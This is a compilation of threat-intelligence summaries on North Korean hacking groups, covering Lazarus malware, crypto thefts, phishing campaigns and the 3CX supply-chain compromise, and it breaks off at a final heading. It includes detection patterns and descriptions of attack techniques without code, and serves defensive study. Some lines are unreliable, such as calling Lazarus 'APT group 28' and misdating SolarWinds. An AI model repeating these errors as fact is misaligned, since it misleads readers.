Infection Chain: Combination of loader, main trojan, and stealer, similar to previous MATA cluster attacks. Included a user-mode rootkit for privilege elevation and security bypass.
Technical Details
Loader Malware: Important strings inside the malware are XORed. It fetches the next stage payload and saves it to a file.
Validator Malware: Decrypts embedded strings, including C2 server addresses. Executes whoami commands to gather Active Directory information and user privileges.
MataDoor Malware: Starts as a service named 'wuausrv'. Contains encrypted default configuration settings. Supports SSL, DTLS, TCP, UDP protocols for communication.
Plugins in MataDoor: Seven plugins embedded, executing commands based on C2 server responses.
Conclusions
The Lazarus group has significantly updated its MATA malware, showing advanced capabilities in network circumvention and proxy chain creation.
The campaign demonstrates the group's evolving tactics and sophisticated approach to targeting industrial entities in Eastern Europe.
 
https://asec.ahnlab.com/wp-content/uploads/2023/10/20231013_Lazarus_OP.Dream_Magic.pdf

AhnLab Cyber Threat Intelligence Report titled "Operation Dream Magic," here is a detailed summary focusing on the Lazarus group's exploitation of the MagicLine vulnerability over a period of seven months:

Overview
Report Title: Operation Dream Magic
Focus: Lazarus group's exploitation of the MagicLine vulnerability.
Duration: Analysis covers a 7-month period.
Publisher: AhnLab Response Team, dated October 13, 2023.
Key Findings
MagicLine Vulnerability Exploitation:

Lazarus group targeted specific articles on news websites, inserting malicious links.
The exploitation process of MagicLine vulnerabilities was similar to previous cases involving the Inisafe vulnerability.
AhnLab teams collaborated to detect and respond to the MagicLine vulnerability exploitation.
Detection Status:

From January to July 2023, AhnLab detected 105 cases of malicious activity exploiting the MagicLine vulnerability across 40 companies and institutions.
The detections were verified as true positives.
Sector-wise Detection:

The IT sector had the highest number of detections (45 cases), followed by defense (14 cases) and media (14 cases).
Specific cases in key sectors were highlighted for their importance.
Case Studies:

The report includes detailed case studies of MagicLine vulnerability exploitation in different sectors.
Examples include a manufacturing company, a media company, and a financial institution.
Malware Analysis:

The report provides an in-depth analysis of the malware used in these attacks.
Techniques such as DLL-Side Loading and Fileless malware were employed.
The Lazarus group's involvement was determined based on similarities in malware reconstruction code and *.SYS file creation processes.
Conclusion
The report concludes that the Lazarus group's hacking activities, targeting companies and institutions rather than individuals, are of significant concern due to the potential for substantial data breaches and national security threats.
Recommendations
AhnLab provided recommendations for responding to and mitigating the effects of these attacks.
Collaboration and Information Sharing
The report was a result of collaboration between AhnLab's response, analysis, and technical support teams, along with cooperation from certain detected companies and national agencies.
Attribution to Lazarus Group
The report attributes the Operation Dream Magic campaign to the Lazarus group based on the analysis of malware, detection logs, and collaboration with national institutions.
 
https://www.virusbulletin.com/uploads/pdf/conference/vb2023/papers/Lazarus-campaigns-and-backdoors-in-2022-2023.pdf

"Lazarus campaigns and backdoors in 2022-23" by Peter Kálnai of ESET, here is a detailed summary focusing on the Lazarus group's activities and backdoors used in their campaigns during 2022 and 2023:

Overview
Author: Peter Kálnai, ESET, Czechia
Focus: Analysis of Lazarus group's recent attacks and backdoors used in 2022-2023.
Context: Lazarus, a North Korea-aligned threat actor, has been active since at least 2009, engaging in cyber espionage, sabotage, and financial gain.
Key Campaigns and Attacks
Operation In(ter)ception:

Targeted aerospace and defense sectors with fake job offers.
Used LinkedIn messaging and emails with malicious files.
Goals: Cyberespionage and data exfiltration.
DangerousPassword Campaigns:

Targeted financial and cryptocurrency sectors.
Used non-native file formats like LNK files, VBScripts, PowerShell, or JavaScript in initial attack stages.
Goals: Theft of financial and crypto assets.
Operation DreamJob:

Used trojanized software related to hiring processes, like PDF viewers and remote access tools.
Targeted various sectors, including aerospace, defense, technology, and media.
Goals: Data exfiltration and financial gain through business email compromise.
Technical Analysis of Backdoors
Execution Chain: Multiple stages of execution, with droppers and loaders leading to RATs (Remote Access Trojans).
Trojanized Open-Source Projects: Lazarus incorporated malicious code into open-source projects to create droppers for the next stage.
Notepad++ Plug-ins: Extensively trojanized for use as droppers.
Geographical Distribution
Lazarus targeted companies and individuals globally, with a diverse geographical distribution.
TTPs (Tactics, Techniques, and Procedures)
Trojanizing Open-Source Projects: Projects like plug-ins for Notepad++ or PDF viewers were trojanized.
Use of Valid Code-Signing Certificates: Employed to lend legitimacy to their malware.
Rich Headers Analysis: Used to analyze the development environment producing their payloads.
Encryption in Malware: Various encryption methods implemented in payloads.
Supply-Chain Attacks
Lazarus demonstrated capability in advanced supply-chain attacks, compromising software vendors to infiltrate their software distribution.
Exploitations
Initech INISAFE CrossWeb EX V3: Exploited to inject malicious DLLs.
CVE-2021-26606 (MagicLine4NX): Buffer overflow vulnerability exploited in Dream Security’s MagicLine4NX software.
Conclusion
The Lazarus group's activities reflect North Korea's state motivations, targeting sectors like aerospace, defense, and financial institutions for espionage and financial gain.
The group has prepared native payloads for major platforms: Windows, Linux, and macOS.
 
APT38 Actor Profile
By Insikt Group | Published Jan 5, 2023
Note
Entities
Sources
APT38 (also known as Bluenoroff, Stardust Chollima, BeagleBoyz, Cryptocore, Leery Turtle, Dangerous Password, CryptoMimic) is a North Korean state-sponsored threat group that primarily conducts financial cyber operations and has been active since at least 2014. The group has overlap with campaigns attributed to the Lazarus Group and some researchers classify it as a subgroup of Lazarus. Similar to Lazarus Group, APT38 is assessed to be associated with with the Reconnaissance General Bureau; however, due to the limited nature of open sources of information on the DPRK’s organizational structure, the strict control of information inside the country, and the potential for disinformation operations, Insikt Group judges the above assessment as low confidence.

APT38 has a history of conducting thorough reconnaissance of their targets before attempting initial access operations. Preferred methods for initial access include strategic web compromise, searching for vulnerable servers on the target’s network, and spear phishing key employees that the group identified during the reconnaissance phase. Once APT38 gains initial access, the group uses both custom malware and internal tools such as Sysmon and file transfer tools already on the target’s system. Previous reporting has highlighted the group’s long dwell time – on average 6 months, but in some cases up to 2 years – to understand a target’s system before deploying additional malware.

APT38 has targeted financial institutions, casinos, cryptocurrency exchanges, Society for Worldwide Interbank Financial Telecommunication (SWIFT) system endpoints, and automated teller machines (ATMs) in at least 38 countries in all regions of the world. Significant operations by the group include the 2016 Bank of Bangladesh heist, during which APT38 stole $81 million, as well as attacks against Bancomext and Banco de Chile. In recent years the group has shifted its targeting to financial technology and cryptocurrency companies as well as their users, and employing .iso and .vhd file formats to evade Mark-of-the-Web (MOTW) security when delivering payloads.

Actor Profile
APT38 Actor Profile
By Insikt Group | Published Jan 5, 2023
Note
Entities
Sources
Primary Entities
Threat Actor
APT38
Related Entities
Mitre Attack Identifier
T1204
T1505.003
T1543.003
T1565.002
T1518
T1070.006
T1204.002
T1082
T1588
T1561
T1071
T1566
T1562.004
T1027.002
T1218.011
T1543
T1218.001
T1059.001
T1059.005
T1070
T1059
T1569.002
T1115
T1070.001
T1518.001
T1053.005
T1562
T1110
T1189
T1217
T1071.001
T1505
T1005
T1135
T1565
T1486
T1565.001
T1053.003
T1105
T1070.004
T1566.001
T1027
T1561.002
T1056
T1049
T1033
T1056.001
T1106
T1057
T1588.002
T1485
T1562.003
T1112
T1569
T1053
T1083
T1059.003
T1565.003
T1529
T1218
Hide
Attack Vector
Watering hole attack
FASTCash
Spear Phishing
Threat Actor
Lazarus Group
Reconnaissance General Bureau (NK)
CryptoCore Group
Malware
KEYMARBLE
HOPLIGHT
ECCENTRICBANDWAGON
DyePack
VIVACIOUSGIFT
CROWDEDFLOUNDER
ELECTRICFISH
PowerRatankba
OpenCarrot
CabbageRAT
msoRAT
Hide
Technology
Cryptocurrency
Company
Bancomext
38
Central Bank of Bangladesh
49
SWIFT
64
Banco de Chile
64
Hide
Country
North Korea

    


Events:

North Korean Group Bluenoroff Targets Banks and Venture Capital Firms in Campaign with New Attack Methods
By Insikt Group | Published Dec 29, 2022 | Last modified Jan 12, 2023
Note
Diamond Model
Entities
Sources
The North Korea-aligned BlueNoroff Group has added new attack tools and delivery methods to its arsenal in a recent campaign targeting the finance and investments sector, according to new research from Kaspersky. In the campaign, BlueNoroff delivered new strains of custom malware via optical disk image (.iso) and virtual hard disk (.vhd) files that contain decoy Microsoft Office attachments. This method allowed BlueNoroff to bypass Microsoft’s Mark-of-the-Web (MotW) protections on victim machines. BlueNoroff registered approximately 70 typosquat domains of primarily banks and venture capital firms in Japan, the US, the UAE, and Vietnam. BlueNoroff used the typosquat domains to send phishing messages to targets at these institutions in an attempt to intercept cryptocurrency transactions involving banks and venture capital firms. Furthermore, BlueNoroff used Visual Basic Script (VBS) and Windows Batch scripts, along with a new downloader, to deliver its payload. 

More information on specific victims and the attack methods that BlueNoroff used to compromise them are in Kaspersky’s full report.

BlueNoroff is a subgroup of the Lazarus Group APT group, known for its involvement in several high-profile heists, including the 2016 theft of $81 million USD from Bangladesh Bank through SWIFT. Lazarus Group’s preferred initial access vectors include spear phishing and strategic web compromise. The group uses a combination of commodity and open-source malware, as well as custom tools for remote access, and has also used multiple open source Offensive Security Tools to conduct network reconnaissance, access credentials, and establish persistence. More recently, Lazarus Group has used social engineering on social networking sites and chat applications such as WhatsApp to deliver weaponized open source software via ISO files to victims. 

While BlueNoroff has traditionally focused on financially motivated operations targeting banks and SWIFT-connected servers. In campaigns tracked as CryptoCore, SnatchCrypto, and CryptoMimic, the group has shifted toward targeting cryptocurrency businesses and private investment firms as the main source of the group’s illegal income, with several high-profile incidents this year, including the theft of $625 million in ETH and USD Coin (USDC) in the March 2022 attack on the Ronin Network. This corresponds to an overall uptick in threat actors’ interest in targeting cryptocurrency and DeFi over the last 2 years.

Insikt Group has been tracking BlueNoroff infrastructure, known as CIPHERROCKET, since July 2021. Since then we have detected at least 22 malicious CIPHERROCKET servers, with the newest ones registered as recently as December 9, 2022. Based on the domains associated with this infrastructure and supporting lure documents we suspect that BlueNoroff are abusing the brands of Japanese cryptocurrency and private investment firms to trick potential victims into opening malicious content, with a likely objective of stealing crypto assets from these organizations.

BlueNoroff, and Lazarus Group more broadly, has been active since at least 2009, and has been observed targeting organizations within the aerospace, defense, engineering, finance, government, media, and technology sectors. The group has proven to be broad in their victimology - notable network intrusions linked to Lazarus Group include the 2014 Sony breach, the global Wannacry ransomware attack, and a major heist resulting in the theft of $81 million USD from Bangladesh Bank through the Society for Worldwide Interbank Financial Telecommunication (SWIFT) global payment network in 2016.

BlueNoroff’s financially-motivated intrusion campaigns targeting traditional banking, e-commerce payment systems, and cryptocurrency operations very likely support the North Korean government’s continued efforts to generate accessible funds for the regime, in spite of the US economic sanctions levied against them. Based on historical trends and the anonymous, decentralized, and largely unregulated nature of cryptocurrencies, Recorded Future believes that BlueNoroff and other DPRK-linked groups are very likely to continue targeting cryptocurrency entities for financial gain.

Given the ongoing disproportionate criminal attention to cryptocurrency in the finance sector, employees should be warned against using company accounts or devices to access cryptocurrency platforms. Additionally, emails or domains referencing common cryptocurrency platforms like Coinbase, MetaMask, or Binance should be monitored.


FBI Says North Korean Hackers Behind $100 Million Horizon Bridge Crypto Theft
By Insikt Group | Published Feb 2, 2023 | Last modified Feb 13, 2023
Note
Diamond Model
Entities
Sources
On January 23, 2023, the US Federal Bureau of Investigation (FBI) confirmed that the Lazarus Group, a cyber threat actor group associated with North Korea and also known as APT38, was responsible for the cyberattack against the blockchain firm Harmony’s Horizon Bridge. The original attack was reported on June 24, 2022, and resulted in the theft of $100 million worth of cryptocurrency.

The FBI reported that on January 13, 2023, Lazarus Group used a privacy protocol called Railgun, which is similar to a cryptocurrency mixer, to launder over $60 million worth of Ethereum (ETH) that had been stolen during its June 2022 theft of Harmony’s Horizon Bridge assets. Some of the stolen Ethereum was then converted to bitcoin (BTC) via virtual asset service providers. The FBI, in cooperation with some of the virtual asset service providers, successfully froze a portion of the stolen funds, while the remainder of stolen funds were transferred to 11 of the adversary’s bitcoin addresses. According to 1 report, 124 bitcoins (approximately $2.84 million) were recovered after the transfers were blocked.

Previously, in April 2022, the FBI, the US Cybersecurity and Infrastructure Security Agency (CISA), and the US Treasury Department published a joint cybersecurity advisory about a phishing campaign they dubbed “TraderTraitor.” The phishing campaign used social engineering techniques to lure its victims into downloading compromised cryptocurrency applications containing the Manuscrypt remote access trojan (RAT). The FBI noted that TraderTraitor had been used by Lazarus Group to execute the June 2022 Harmony’s Horizon Bridge theft.

On April 21, 2022, Twitter user @JAMESWT_MHT shared samples of “TraderTraitor” distributed in spear phishing campaigns, and Insikt Group obtained samples for macOS (Mach-O file) and Windows (EXE file) systems. An Intezer Sandbox analysis identified the Mach-O sample as suspicious and the executable sample as malicious. The Mach-O file contains commands to retrieve host information and contacts the domain aideck[.]net. The EXE file contacts the same domain. It also detects virtual machines and checks for system information. Additional analysis from Intezer detected Lazarus signatures in 69% of the sample’s code. Relevant indicators of compromise (IOCs) from this analysis are listed below.

It is highly likely that North Korean state-sponsored cyber actors will continue to target the financial and cryptocurrency industry in an effort to generate revenue for North Korean government priorities that have been hampered by sanctions, such as weapons programs. It is also highly likely that threat actors will continue to use cryptocurrency because its inherent pseudonymity, the ability to direct funding flows virtually, and the inconsistent regulatory oversight between countries make it an attractive funding option. While multiple laws, regulations, and guidelines already exist with respect to cryptocurrency and anti-money laundering efforts, these are often inconsistent across jurisdictions, and where they do exist, are not always fully enforced.

According to the joint advisory on TraderTraitor, the following controls and mitigations should be used to protect against future attacks.
• Do not trust third-party downloads and be especially cautious with cryptocurrency applications. North Korean actors have been increasingly active with currency generation operations. Users should always verify file downloads and ensure the source is from a reputable or primary (preferred) source and not from a third-party vendor.
• Enforce credential requirements and multifactor authentication. North Korean malicious cyber actors continuously target user credentials, email, social media, and private business accounts. Be aware of MFA interception techniques for some MFA implementations and monitor for anomalous logins.
• Educate users on social engineering on social media and spearphishing. North Korean actors rely heavily on social engineering, abusing email and social media platforms to build trust and send malicious documents to unsuspecting users.

FBI Confirms North Korea-linked Lazarus APT Group Responsible for June 2022 Cyberattack Against Harmony’s Horizon Bridge
By Insikt Group | Published Jan 25, 2023 | Last modified Feb 14, 2023
Note
Diamond Model
Entities
Sources
On January 23, 2023, the U.S. Federal Bureau of Investigation (FBI) confirmed that the North Korea-linked advanced persistent threat (APT) group 28, also known as Lazarus Group, was responsible for the cyberattack against blockchain firm Harmony’s Horizon Bridge, which was reported on June 24, 2022. The cyberattack resulted in the theft of $100 million worth of cryptocurrency by Lazarus Group.

The FBI reported that on January 13, 2023, Lazarus Group had used a privacy protocol called Railgun to launder over $60 million worth of Ethereum (ETH) that had been stolen during its June 2022 theft of Harmony’s Horizon Bridge assets. Some of the stolen Ethereum was converted to bitcoin (BTC) via virtual asset service providers. The FBI, in cooperation with some of the virtual asset service providers, had successfully frozen a portion of the stolen funds, while the remainder of stolen funds were transferred to 11 of the adversary’s bitcoin addresses.

Previously, in April 2022, the FBI, the U.S. Cybersecurity and Infrastructure Security Agency (CISA), and the U.S. Treasury Department published a joint cybersecurity advisory about a phishing campaign they dubbed “TraderTraitor.” The phishing campaign utilized social engineering techniques to lure its victims into downloading compromised cryptocurrency applications containing the Manuscrypt remote access trojan (RAT). The FBI noted that TraderTraitor had been used by Lazarus Group to execute the June 2022 Harmony’s Horizon Bridge cyberattack and asset theft.

Coinbase Hack Linked to Group Responsible for Twilio, CloudFlare Hacks
By Insikt Group | Published Mar 6, 2023 | Last modified Mar 13, 2023
Note
Diamond Model
Entities
Sources
Coinbase disclosed on February 20, 2023, that it was the target of an SMS phishing campaign on February 5, 2023, which ultimately resulted in the exposure of limited internal data. Coinbase employees largely ignored the phishing messages; however, 1 employee was lured into clicking a malicious link and entering their username and password. After acquiring this username and password credential pair, the threat actor behind the campaign engaged in repeated attempts to gain remote access to Coinbase, leading to subsequently blocked login attempts. However, according to Coinbase, the purportedly sophisticated actor, which Coinbase believes is linked to the 0ktapus phishing operation, proceeded to call the affected employee's phone pretending to be from Coinbase’s corporate Information Technology (IT) department. The attacker convinced the employee to follow some instructions initially regarding account access and information; however, subsequent requests garnered increased suspicion as the conversation continued, causing the Computer Security Incident Response Team (CSIRT) to reach out to the employee, resulting in the termination of all communication.

Coinbase states that the threat actor acquired only limited contact information, including some employee names, email addresses, and phone numbers. No funds were reported as lost, and no further customer information was compromised.

Coinbase disclosed the information to give transparency on how vulnerable organizations can be to social engineering attacks and highlight details regarding the adversary's tactics, techniques, and procedures (TTPs). Below are several detection opportunities provided by Coinbase that defenders can look for within log data:

• Any web traffic to the following web address; sso-*.com, *-sso.com, login.*-sso.com, dashboard-*.com, or *-dashboard.com.
• Any downloads or attempted downloads for AnyDesk or ISL Online remote desktop viewers, especially if that software is not common in your environment.
• Attempted accesses from Mullvad VPN
• Incoming phone calls or text messages from Google Voice, Skype, Vonage, Nexmo, or Bandwidth[.].com
• Unexpected attempts to install 'EditThisCookie' browser extension

0ktapus is a phishing operation discovered by Group-IB dating back to March 2022 that resulted in the compromise of over 9,000 accounts and of 130 organizations including Twilio, Cloudflare, and DoorDash. The campaign focused on stealing Okta identity credentials and 2-factor authentication (2FA) codes from customers and employees of targeted companies to gain access to corporate services. The targeted companies were customers of Okta Inc., an American identity and access management company.

Coinbase and customers of Coinbase have regularly been the subject of phishing and social engineering attacks. The following are several cyber threat events within the last 2 years involving Coinbase.

• In November 2022, an ongoing phishing campaign was identified that bypassed 2-factor authentication (2FA) by communicating with victims via an in-browser chat window.
• The North Korean Lazarus Group was identified in 2022 by SentinelOne and Malwarebytes conducting Coinbase attack chains through the use of job offer lures via LinkedIn to spread trojanized cryptocurrency wallets and investment applications that steal people’s private keys and siphon their holdings.
• On October 1, 2021, Coinbase revealed that an unknown threat actor had stolen cryptocurrency from approximately 6,000 customers via a flaw in the exchange’s SMS multi-factor authentication security feature.

The expansion of the cryptocurrency market and adoption of cryptocurrency by over 420 million users has made it a prime target for threat actors looking to defraud investors. In 2022, cryptocurrency cybercrime profits reached an all-time high, recording over $20 billion in revenue, according to a Chainalysis study. The decentralized nature of cryptocurrency means that it is difficult to cancel or reverse transferred funds, so they are very attractive for threat actors who hope to steal funds for good. There are several methods that threat actors can use to target users and companies of cryptocurrency; however, defrauding cryptocurrency users through phishing to gain access to cryptocurrency wallets and corporate services remains a frequent occurrence. A white paper conducted by Interisle found that, from May 2021 to April 2022, cryptocurrency-themed phishing had risen 257%.

In addition to the TTPs from Coinbase, we recommend the following guidelines to avoid social engineering and phishing attacks targeted at cryptocurrency companies and users.

• Be suspicious of common indicators of malicious messages, including; suspicious sender addresses, generic greetings, spoofed hyperlinks, incorrect spelling, and suspicious or unprompted attachments.
• Only provide information regarding personal or organizational information if you are confident of the person’s identity. If unable, contact the company directly and verify.
• Do not reveal sensitive personal or financial information in emails, and do not respond to emails that request this information.
• Verify a website's security (e.g., HTTPS vs. HTTP) before sending sensitive information.

Lazarus Group's Operation No Pineapple! Targeted Medical Research and Technology Sectors
By Insikt Group | Published Feb 3, 2023 | Last modified Mar 23, 2023
Note
Diamond Model
Entities
Sources
The North Korean advanced persistent threat (APT) Lazarus Group stole 100GB of data from multiple medical research firms and technology providers in a cyber espionage campaign dubbed Operation No Pineapple!. Security researchers at WithSecure published a report on February 2, 2023, in which they attributed Operation No Pineapple! to Lazarus Group based on similar tactics, techniques, and procedures (TTPs) from previous Lazarus Group campaigns, as well as victimology and time zone hours of operation. Notably, DTrack and GREASE were 2 malware variants used in the campaign that Lazarus Group has also historically used.

Lazarus Group gained initial access to victim networks in August 2022 by exploiting vulnerabilities in Zimbra mail servers (CVE-2022-27925 and CVE-2022-37042), allowing it to install open-source web shells (base.jsp and carbon.jsp) for persistence and use of tunneling software, such as Plink and 3Proxy. In 1 particular attack, the attackers deployed Cobalt Strike beacons and used compromised accounts to establish persistence.

Once attackers established persistence on victim devices, the group used the Impacket “atexec” module to execute payloads and scripts, like PowerShell, Windows Command Shell, and Unix. Lazarus Group then exploited CVE-2021-4034, a vulnerability in pkexec (also known as pwnkit), to elevate system privileges, access sensitive mailbox data, and dump credentials via Local Security Authority Subsystem Service (LSASS) and Mimikatz.

Lazarus Group returned 1 month after its initial intrusion to reconnoiter networks and gather more information, deploying several binaries that were signed with “LAMERA CORPORATION LIMITED”. During the 2 months in which Lazarus Group remained undetected on a victim’s network, it managed to exfiltrate approximately 100 GB of data. Lazarus Group concealed its malicious activities by deleting artifacts from infected networks and clearing logs, and communicated with the command-and-control (C2) server through the SSH protocol.

Dtrack has been a regular feature of Lazarus Group campaigns, which are most prominently motivated by financial reward, but have also involved espionage. Historically, Lazarus Group deployed Dtrack in attacks on banks, research organizations, and energy and utilities companies. Clients can monitor Dtrack with the YARA rule attached to a Hunting Package, which Recorded Future developed based on unique strings in the malware, as well as with import hashes of encrypted versions of Dtrack.

GREASE has featured in campaigns by Kimsuky, another North Korean APT. Kimsuky has itself been associated with APT37, another North Korean regime-sponsored cyber threat group that has historically targeted organizations in defense, government, media, chemical, electronic, manufacturing, aerospace, automotive, and healthcare.

WithSecure attributed Operation No Pineapple! to Lazarus Group based on TTPs from previous Lazarus Group operations, however, researchers observed new techniques as well. These included the use of host IP addresses without domain names, deployment of a new variant of the Dtrack infostealer, and use of a new variant of GREASE malware for creating administrator accounts and bypassing protection.

During Operation No Pineapple!, Lazarus Group took several measures to ensure that it operated stealthily. Lazarus Group used IP addresses without domain names to host malware, and a separate backdoor to transfer data that it exfiltrated locally, effectively turning compromised host machines into C2 servers themselves.

Operation No Pineapple! targeted enterprises not only in medical research and technology industries, but also the chemical engineering, energy, defense, and academia sectors. These industries are often the targets of state-sponsored APT groups with geostrategic objectives.

Successful APT operations do not necessarily result in major, headline-grabbing disruption of service events (like a DDoS attacks). Instead, cyberespionage operations often cause damage to victims that is less immediately destructive or apparent. By breaching target networks stealthily and persisting on them undetected for extended periods of time (2 months in the case of Operation No Pineapple!), APT groups or others conducting surveillance can exfiltrate large quantities of sensitive or classified data. The adversary can potentially cause even more damage (in terms of significance) depending on the data or intelligence they collect and exfiltrate: consider the long term attack on SolarWinds, a technology provider for many US federal government agencies, in which Russian intelligence operatives remained undetected on networks for up to 9 months, until the breach was discovered in December 2021.

North Korean Espionage Group Engages in Cybercrime to Fund Operations
By Insikt Group | Published Apr 5, 2023
Note
Diamond Model
Entities
Sources
A previously-undocumented North Korean APT group is engaging in cybercrime to fund its espionage operations against critical sectors in the West. Security researchers at Mandiant published new findings on the group, which they’ve dubbed APT43, on March 28, 2023. APT43’s specific victims are individuals in government, defense, and academic research in the US, Europe, Japan, and South Korea. APT43 has been active for at least 5 years, during which time it has also targeted diplomats, university professors, and think tank researchers who specialize in Korean peninsula geopolitics and related fields like nuclear security. Mandiant researchers assessed with high confidence that APT43 is sponsored by the North Korean regime, and they linked the threat group specifically to the Reconnaissance General Bureau (RGB), Pyongyang’s main foreign intelligence apparatus. APT43’s objectives are geopolitical in nature, and align closely with North Korea’s geostrategic objectives, researchers said.

APT43 sends spearphishing emails that direct its victims to malicious websites posing as legitimate login pages. Victims enter their credentials into these fake websites, allowing adversaries to harvest their credentials. APT43 then uses the stolen credentials to authenticate to legitimate services to collect information about the victims. Researchers said that APT43 operators also accessed victims’ contact lists to find new targets for their spearphishing campaign.

APT43’s spearphishing tactics are not confined to luring victims into clicking on malicious links or authenticating to malware-infected websites, however. In some cases, researchers said that APT43 operators simply emailed geopolitics researchers in academia, masquerading as their colleagues, and solicited their opinions or analysis on security and defense-related topics.

The information that APT43 is most interested in accessing is that which is held by the US Military, defense agencies, and private enterprises that make up the defense industrial base (DIB) in the US and in allied countries. Western academic researchers who study nuclear security and nonproliferation policies are also targets of the group’s reconnaissance operations. Researchers noted that private manufacturers of goods whose exports to North Korea are prohibited by US sanctions are also targets.

Mandiant researchers said that unlike other groups that act on behalf of the North Korean regime, APT43 is responsible for funding its own operations, and cybercrime is its preferred method for raising money. Specifically, they have used malicious Android apps to lure Chinese mobile users into fraudulent cryptocurrency loan schemes. APT43 then launders the cryptocurrency it steals from these Chinese victims and launders it under different aliases to cover its tracks.

Mandiant researchers said that previously-observed APT43 activity was attributed to groups like Kimsuky (Thallium), and that APT43 has used malware variants that Lazarus Group has also used. Kimsuky has been highly active in espionage operations targeting South Korea’s Atomic Energy Research Institute (KAERI), Russian researchers, South Korean think tanks, and pharmaceutical companies researching and developing COVID-19 vaccines. Spearphishing has likewise played a vital role in Kimsuky operations as one of its primary vectors for obtaining initial access to its victims. Kimsuky has frequently used Microsoft Word and Hancom Office lure documents with embedded Visual Basic scripts or VBS. (Hancom Office is South Korean software).

APT43’s commonly used malware variants include publicly-available strains like gh0st RAT, QuasarRAT, Amadey, and Lonejogger (a tool associated with APT38 or UNC1069). However, the group also has a set of its own custom attack tools, like Pencildown, Pendown, Venombite, Egghatch, Logcabin, Lateop, BabyShark, and Hangman. Mandiant researchers provided a more complete list of the malware variants they detected in APT43 campaigns in their report. These include downloaders, droppers, builders, launchers, data miners, and utilities.

Mandiant researchers concluded that previously-observed overlaps in APT43’s attack infrastructure, tools, and targeting, with the TTPs of other North Korean cyberespionage groups like Kimsuky, Lazarus Group, and TEMP.Hermit are most likely temporary in nature and reflect an effort in sharing resources. Sharing of such resources among APT groups from the same nation-states is not uncommon; Recorded Future has observed significant overlaps in malware tools and attack infrastructure between distinct Chinese APT groups acting on behalf of the Chinese government, for instance.

In addition to the malware tools and attack infrastructure commonalities with other known North Korean state-sponsored APT groups, Mandiant researchers noted shifts in APT43’s victimology that indicate close correlation with the North Korean regime. From the time Mandiant started tracking APT43 in 2018 until October 2020, the group’s victims were consistently entities related to government and defense. But from October 2020 through October 2021, Mandiant observed APT43 start to target entities in the health and pharmaceutical sectors. They attributed this largely to North Korean regime objectives in combating COVID-19 at the height of the pandemic. During this 12-month period, however, researchers said that APT43 operations targeting government and defense entities remained ongoing. In an indication of the group’s sophistication, researchers observed the group use different malware variants for different targets. For example, researchers observed APT43 deploy variants like VENOMBITE, SWEETDROP, and BITTERSWEET in attacks solely on the South Korean healthcare sector.

APT43 is likely to continue its operations targeting government and government-adjacent organizations, especially those concerned with security and defense, so long as these remain relevant to the North Korean regime’s geostrategic objectives. We expect that APT43 will continue to use the initial access methods we have already observed, especially spearphishing through malicious links and direct email messages, so long as they continue to yield results and provide the group with the information they seek, including any data that provides the regime with an advantage in a potential future conflict with North Korea’s enemies.

Trojanized 3CXDesktopApp Binary Files Deployed in Supply Chain Attack
By Insikt Group | Published Apr 5, 2023
Note
Diamond Model
Entities
Sources
On March 29, 2023, open source reporting emerged from CrowdStrike's Falcon OverWatch within a subreddit specific to the company detailing their observations around unexpected malicious activity emanating from a legitimate, signed binary, 3CXDesktopApp. 3CXDesktopApp is a softphone application from 3CX for voice over IP (VoIP). Endpoints with the 3CXDesktopApp application installed were identified receiving a malicious update of this software that was signed by 3CX and downloaded from the company’s servers. This was part of the default automatic update process and would also result in information-stealing malware being installed on the victim’s host. Researchers at Volexity stated that it is possible that additional malicious activity may have taken place if the threat actor deemed targeted endpoints to be of sufficient interest.

The malicious activity identified includes beaconing to actor-controlled infrastructure, deployment of second-stage payloads, and, in a small number of cases, hands-on-keyboard activity. OverWatch has notified customers where hands-on-keyboard activity has been observed and the company is in contact with customers under their management where 3CXDesktopApp is present.

The 3CX PBX client is available for Windows, macOS, and Linux; with mobile versions for Android and iOS also being available, as well as a Chrome extension and a Progressive Web App (PWA) browser-based version of the client. 3CX’s CEO Nick Galea stated the PWA version of the client could avoid compromise. At time of writing, activity has been observed on both Windows and macOS. The advisory on Reddit also stated that CrowdStrike's Intelligence Team is in contact with 3CX and that there is suspected nation-state involvement by the threat actor LABYRINTH CHOLLIMA. LABYRINTH CHOLLIMA overlaps with Insikt Group reporting on North Korean state-sponsored activity associated with Lazarus Group.

Insikt Group analyzed the first stage loader, 3CXDestkopApp.exe, in addition to the 2 second stage files and a MacOS installer associated with the 3CXDesktop supply chain compromise. While we did not analyze the MSI installer file, other researchers advise that it contains 3 files of interest to this investigation: 3CXDesktopApp.exe, ffmpeg.dll, and d3dcompiler_47.dll. The first stage loader, 3CXDesktopApp.exe, loads the compromised version of ffmpeg.dll. Next, ffmpeg.dll’s primary function is to read the encrypted shellcode from the end of the d3dcompiler_47.dll file, which is demarcated by 8 bytes (0xfeedface). The shellcode is decrypted using a hardcoded, 12 character-length key and a standard RC4 cipher.

One of the purposes of the shellcode is to load an embedded DLL which ultimately downloads various files that contain additional code. Open source reporting stated that the next-stage payload is a JSON object that is then parsed and must further be decrypted (with the same AES-GCM decryption function). Other researchers stated that the next stage is expected to be a 64-bit PE that is reflectively loaded through a shellcode loader stored at the head of the file. A shellcode stub prepended to the payload used to map it into memory shares similarities with APPLEJEUS loader stubs, which has been historically associated with North Korean threat activity.

In terms of attacker infrastructure, the domains used in these attacks were reported to be hosted on shared infrastructure and appear to proxy requests to an unknown upstream C2. The domains were registered with several providers, including NameCheap, Public Domain Registry, and NameSilo. Some of the domains were not registered using WHOIS protection, and each was registered using a unique email address. CrowdStrike Intelligence has assessed there is nation-state involvement specifically from the threat actor LABYRINTH CHOLLIMA which overlaps with Insikt Group’s coverage of Lazarus Group activity.

In an April 1, 2023, statement, 3CX stated that they continued to investigate the attack and recommended that customers uninstall the 3CX Electron Desktop Application. However, in an April 3, 2023, statement to The Register, Galea seemingly stated that the indicators of compromise (IOCs) from the attack were false positives. It remains unclear what this recent statement means for the incident and the application’s security, especially with simultaneous reports of a known backdoor being deployed through the supply chain attack.

Several reports have outlined the known extent of this ongoing attack. Check Point research published that they are aware of 3 trojanized Windows installers, all with downloaders in the form of DLL files. Furthermore, on Twitter, security researchers Patrick Wardle published details about the malware observed via malware analysis. In terms of exposure, Huntress Labs reported at the time of writing their advisory that a Shodan search showed 242,519 exposed phone management consoles.

The extent of this activity is currently unknown and additional mitigation steps are available within the Reddit thread, which is being updated periodically. These steps include detecting instances of 3CXDesktopApp and ensuring that suspicious processes linked to it are contained and eradicated. Lastly, Insikt Group is aware of other open source hunting techniques that have been shared within open source reporting in association with this activity. A roundup of reported Sigma and YARA rules, including from Recorded Future,to assist with the detection process is available to review.

North Korea Lazarus Group DeathNote Campaign Expands Tactics, Techniques, and Procedures
By Insikt Group | Published Apr 13, 2023
Note
